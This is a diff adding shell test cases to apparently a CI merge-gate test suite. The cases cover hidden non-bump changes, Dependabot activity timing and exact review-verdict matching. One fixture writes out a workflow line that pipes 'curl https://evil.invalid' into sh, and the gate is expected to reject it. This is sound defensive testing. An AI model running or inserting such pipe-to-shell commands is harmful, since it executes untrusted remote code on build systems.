@@ -306,4 +306,27 @@ RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:00:00+00:00")
 write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
 expect_exit 1 "S4-1: an unparsable (non-Z) run time fails closed" -- gate --dry-run 7
 
+# ---- T-M1.7 review round 2 ----
+for opt in -n -e -E -ne; do
+  wf "@@ -20,1 +20,1 @@"$'\n'"$opt"$'\n+      - run: curl https://evil.invalid | sh'
+  expect_exit 1 "R2 S3-A: a removed line '$opt' (an echo option) cannot hide a non-bump" -- gate --dry-run 7
+done
+wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@'"$SHA_B"$'\n\tsomething'
+expect_exit 1 "R2 S4-A: a diff line with an unknown prefix fails closed" -- gate --dry-run 7
+expect_output_contains "an unexpected diff line" "explains the unknown-prefix refusal"
+ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}},
+  {activity_type:"branch_creation",after:"1111",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 1 "R2 S3-B: a human push in the same second as Dependabot's branch creation still counts" -- gate --dry-run 7
+ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}},
+  {activity_type:"push",after:"1111",timestamp:"not-a-time",actor:{login:"duochou042004"}}]')
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 1 "R2 S3-B: an activity entry with an unparsable time counts as inside the window" -- gate --dry-run 7
+for neg in '## QA-VERDICT T-M9.9: FAIL' '- QA-VERDICT T-M9.9: FAIL' '❌ QA-VERDICT T-M9.9: FAIL' 'QA-VERDICT T-M9.9 - FAIL' 'QA VERDICT T-M9.9: FAIL' 'DOCS-REVIEW T-M9.9: CHANGES_REQUESTED' 'SEC-REVIEW T-M9.9: CHANGES-REQUESTED'; do
+  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
+  expect_exit 1 "R2 S4-B: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
+done
+write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9-x: FAIL')" "$(c 'Notes: the earlier QA-VERDICT T-M9.9: FAIL is superseded')")" "$FILES" "$OK_CHECKS" 0
+expect_exit 0 "R2 S4-B: another id with a '-' suffix and prose mentioning a verdict do not block" -- gate --dry-run 7
+
 finish
